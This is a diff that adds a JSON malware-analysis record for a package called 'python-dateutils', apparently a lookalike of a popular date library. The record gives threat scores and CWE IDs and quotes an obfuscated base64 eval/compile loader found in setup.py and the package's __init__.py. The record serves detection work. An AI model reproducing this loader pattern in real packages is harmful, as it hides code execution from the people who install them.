@@ -1,0 +1,38 @@
+{
+  "package_metadata": {
+    "name": "python-dateutils",
+    "version": "3.0.2",
+    "author_email": ""
+  },
+  "behavior_analysis": {
+    "file_operations": [],
+    "network_endpoints": [],
+    "process_spawns": [
+      "setup.py:7",
+      "setup.py:8",
+      "src/dateutil/__init__.py:8"
+    ]
+  },
+  "malicious_code": {
+    "suspicious_modules": [
+      {
+        "filename": "setup.py",
+        "code_snippet": "eval(compile(base64.b64decode(eval('\\\\x74\\\\x72\\\\x75\\\\x73\\\\x74')), '<string>', 'exec'))"
+      },
+      {
+        "filename": "src/dateutil/__init__.py",
+        "code_snippet": "eval(compile(base64.b64decode(eval('\\\\x74\\\\x72\\\\x75\\\\x73\\\\x74')), '<string>', 'exec'))"
+      }
+    ]
+  },
+  "threat_assessment": {
+    "malware_score": 0.9,
+    "risk_score": 0.85,
+    "confidence": 0.95,
+    "cwe_ids": [
+      "CWE-94",
+      "CWE-20",
+      "CWE-502"
+    ]
+  }
+}
